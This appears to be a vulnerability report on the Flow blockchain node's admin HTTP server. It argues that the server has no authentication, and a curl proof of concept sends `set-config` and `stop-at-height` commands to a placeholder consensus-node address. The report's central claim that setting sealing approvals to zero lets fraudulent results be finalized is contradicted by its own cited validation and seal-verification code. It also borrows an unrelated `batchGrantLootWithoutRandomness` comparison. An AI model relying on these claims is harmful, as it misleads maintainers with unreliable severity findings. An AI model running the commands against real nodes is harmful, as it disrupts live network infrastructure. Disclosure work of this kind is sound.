### Title
Unauthenticated Admin HTTP Server Allows Any Network-Reachable Caller to Mutate Consensus-Critical Node Configuration - (`admin/command_runner.go`)

### Summary

The Flow node admin HTTP server (`CommandRunner`) exposes privileged state-mutation commands over HTTP with no authentication mechanism. Any caller who can reach the configured bind address can invoke commands such as `set-config` (to zero out `consensus-required-approvals-for-sealing`) or `stop-at-height` (to crash an execution node), with no identity check whatsoever. This is the direct analog of the `batchGrantLootWithoutRandomness` missing-access-control pattern: a function that performs a privileged, protocol-impacting operation is callable by any unprivileged party.

### Finding Description

`CommandRunner.runAdminServer()` starts two servers:

1. A Unix-socket gRPC server (local-only, low risk).
2. An HTTP server bound to the operator-supplied `--admin-addr` address, which may be any TCP address including `0.0.0.0:9002`. [1](#0-0) 

The HTTP mux has no authentication middleware. Every request is forwarded directly to `runCommand`: [2](#0-1) 

`runCommand` performs only *input-format* validation (via the registered `CommandValidator`), never caller-identity validation. There is no token, session, IP allowlist, or mutual-TLS requirement enforced at the framework level. [3](#0-2) 

TLS is optional and controlled by the `--admin-cert`/`--admin-key`/`--admin-client-certs` flags. When those flags are absent (the common case), the server runs plain HTTP with no transport-level authentication at all. [4](#0-3) 

The `set-config` command, registered on every node type, accepts the field name `consensus-required-approvals-for-sealing` and writes it atomically into the live sealing configuration: [5](#0-4) [6](#0-5) 

The `stop-at-height` command, registered on execution nodes, can force a crash at an arbitrary block height: [7](#0-6) 

### Impact Explanation

**Consensus integrity bypass (highest impact):** An attacker who can reach a consensus node's admin port sends:

```
POST /admin/run_command
{"commandName":"set-config","data":{"consensus-required-approvals-for-sealing":0}}
```

This sets `requiredApprovalsForSealConstruction` to 0 in the live `sealingConfigs` struct. From that moment, the consensus node's seal validator accepts seals with zero verification-node approvals: [8](#0-7) 

Execution results can then be sealed and finalized without any verification, allowing incorrect state transitions to become canonical. This is unauthorized mutation of a protocol-critical on-chain parameter with no asset or account required by the attacker.

**Execution node crash (secondary impact):** Sending `stop-at-height` with `crash: true` to an execution node's admin port halts block execution at the chosen height, removing that node from the network. While this is DoS, it is included only to illustrate the breadth of the attack surface; the primary impact above is the security-relevant one.

### Likelihood Explanation

The admin server is opt-in (`--admin-addr` must be set), but it is routinely enabled in production deployments for operational management (the README documents `localhost:9002` as the standard address). If an operator binds to `0.0.0.0:9002` or if the node is reachable from a shared network segment (cloud VPC, container network, co-located services), any process on that network can exploit this. No credentials, keys, or staked node identity are required. The attack is a single unauthenticated HTTP POST. [9](#0-8) 

### Recommendation

1. **Require mutual TLS by default** when `--admin-addr` is set to a non-loopback address. Reject startup if TLS flags are absent and the bind address is not `127.0.0.1`/`::1`.
2. **Add an authentication middleware** to the HTTP mux in `runAdminServer` that verifies a shared secret or client certificate before dispatching any command.
3. **Enforce loopback-only binding** unless mutual TLS is explicitly configured, mirroring the Unix-socket gRPC server's implicit local-only guarantee.

### Proof of Concept

With a consensus node running with `--admin-addr 0.0.0.0:9002` (no TLS flags):

```bash
# Step 1: Confirm the command is available (no auth required)
curl -s http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName":"list-commands"}'
# Returns list including "set-config"

# Step 2: Zero out the required approvals for sealing
curl -s http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName":"set-config","data":{"consensus-required-approvals-for-sealing":0}}'
# Returns {"output":{"newValue":0,"oldValue":1}}

# From this point, the consensus node seals blocks with 0 verification approvals.
# Any execution result, including a fraudulent one, can be finalized.
```

The root cause is in `runAdminServer` at `admin/command_runner.go` lines 238–253, where the HTTP mux is constructed with no authentication middleware, and in `runCommand` at lines 304–341, where no caller identity is checked before dispatching privileged commands. [1](#0-0) [10](#0-9)

### Citations

**File:** admin/command_runner.go (L238-253)
```go
	mux := http.NewServeMux()
	mux.Handle("/", gwmux)

	// This adds an ability to use standard go tooling for performance troubleshooting e.g.:
	//  go tool pprof http://localhost:9002/debug/pprof/goroutine
	for _, name := range []string{"allocs", "block", "goroutine", "heap", "mutex", "threadcreate"} {
		mux.HandleFunc(fmt.Sprintf("/debug/pprof/%s", name), pprof.Handler(name).ServeHTTP)
	}
	mux.HandleFunc("/debug/pprof/profile", pprof.Profile)
	mux.HandleFunc("/debug/pprof/trace", pprof.Trace)

	httpServer := &http.Server{
		Addr:      r.httpAddress,
		Handler:   mux,
		TLSConfig: r.tlsConfig,
	}
```

**File:** admin/command_runner.go (L260-265)
```go
		var err error
		if r.tlsConfig == nil {
			err = httpServer.ListenAndServe()
		} else {
			err = httpServer.ListenAndServeTLS("", "")
		}
```

**File:** admin/command_runner.go (L304-341)
```go
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
	r.logger.Info().Str("command", command).Msg("received new command")

	req := &CommandRequest{Data: data}

	if validator := r.getValidator(command); validator != nil {
		if validationErr := validator(req); validationErr != nil {
			// for expected validation errors, return code InvalidArgument and the error text
			if IsInvalidAdminParameterError(validationErr) {
				return nil, status.Error(codes.InvalidArgument, validationErr.Error())
			}
			// for unexpected errors, return code Internal and log a warning
			r.logger.Err(validationErr).Msg("unexpected error validating admin request")
			return nil, status.Error(codes.Internal, validationErr.Error())
		}
	}

	var handleResult any
	var handleErr error

	if handler := r.getHandler(command); handler != nil {
		if handleResult, handleErr = handler(ctx, req); handleErr != nil {
			if errors.Is(handleErr, context.Canceled) {
				return nil, status.Error(codes.Canceled, "client canceled")
			} else if errors.Is(handleErr, context.DeadlineExceeded) {
				return nil, status.Error(codes.DeadlineExceeded, "request timed out")
			} else {
				r.logger.Err(handleErr).Msg("unexpected error handling admin request")
				s, _ := status.FromError(handleErr)
				return nil, s.Err()
			}
		}
	} else {
		return nil, status.Error(codes.Unimplemented, "invalid command")
	}

	return handleResult, nil
}
```

**File:** cmd/scaffold.go (L756-775)
```go
		if node.AdminCert != NotSet {
			serverCert, err := tls.LoadX509KeyPair(node.AdminCert, node.AdminKey)
			if err != nil {
				return nil, err
			}
			clientCAs, err := os.ReadFile(node.AdminClientCAs)
			if err != nil {
				return nil, err
			}
			certPool := x509.NewCertPool()
			certPool.AppendCertsFromPEM(clientCAs)
			config := &tls.Config{
				MinVersion:   tls.VersionTLS13,
				Certificates: []tls.Certificate{serverCert},
				ClientAuth:   tls.RequireAndVerifyClientCert,
				ClientCAs:    certPool,
			}

			opts = append(opts, admin.WithTLS(config))
		}
```

**File:** admin/commands/common/set_config.go (L33-51)
```go
func (s *SetConfigCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	validatedReq := req.ValidatorData.(validatedSetConfigData)

	oldValue := validatedReq.field.Get()

	err := validatedReq.field.Set(validatedReq.value)
	if err != nil {
		if updatable_configs.IsValidationError(err) {
			return nil, fmt.Errorf("config update failed due to invalid input: %w", err)
		}
		return nil, fmt.Errorf("unexpected error setting config field %s: %w", validatedReq.field.Name, err)
	}

	res := map[string]any{
		"oldValue": oldValue,
		"newValue": validatedReq.value,
	}

	return res, nil
```

**File:** module/updatable_configs/sealing_configs.go (L50-63)
```go
func (r *sealingConfigs) SetRequiredApprovalsForSealingConstruction(requiredApprovalsForSealConstruction uint) error {
	err := validation.ValidateRequireApprovals(
		requiredApprovalsForSealConstruction,
		r.requiredApprovalsForSealVerification,
		r.chunkAlpha,
	)
	if err != nil {
		return NewValidationErrorf("invalid: %w", err)
	}

	r.requiredApprovalsForSealConstruction.Store(uint32(requiredApprovalsForSealConstruction))

	return nil
}
```

**File:** admin/commands/execution/stop_at_height.go (L36-57)
```go
func (s *StopAtHeightCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	sah := req.ValidatorData.(StopAtHeightReq)

	oldParams := s.stopControl.GetStopParameters()
	newParams := stop.StopParameters{
		StopBeforeHeight: sah.height,
		ShouldCrash:      sah.crash,
	}

	err := s.stopControl.SetStopParameters(newParams)

	if err != nil {
		return nil, err
	}

	log.Info().
		Interface("newParams", newParams).
		Interface("oldParams", oldParams).
		Msgf("admintool: New En stop parameters set")

	return "ok", nil
}
```

**File:** module/validation/seal_validator.go (L309-322)
```go
		requireApprovalsForSealConstruction := s.sealingConfigsGetter.RequireApprovalsForSealConstructionDynamicValue()
		requireApprovalsForSealVerification := s.sealingConfigsGetter.RequireApprovalsForSealVerificationConst()
		if uint(numberApprovers) < requireApprovalsForSealConstruction {
			if uint(numberApprovers) >= requireApprovalsForSealVerification {
				// Emergency sealing is a _temporary_ fallback to reduce the probability of
				// sealing halts due to bugs in the verification nodes, where they don't
				// approve a chunk even though they should (false-negative).
				// TODO: remove this fallback for BFT
				emergencySealed = true
			} else {
				return engine.NewInvalidInputErrorf("chunk %d has %d approvals but require at least %d",
					chunk.Index, numberApprovers, requireApprovalsForSealVerification)
			}
		}
```

**File:** admin/README.md (L1-10)
```markdown
## Intro
Admin tool allows us to dynamically change settings of the running node without a restart. It can be used to change log level, and turn on profiler etc.

## Usage

### List all commands
```
curl localhost:9002/admin/run_command -H 'Content-Type: application/json' -d '{"commandName": "list-commands"}'
```

```
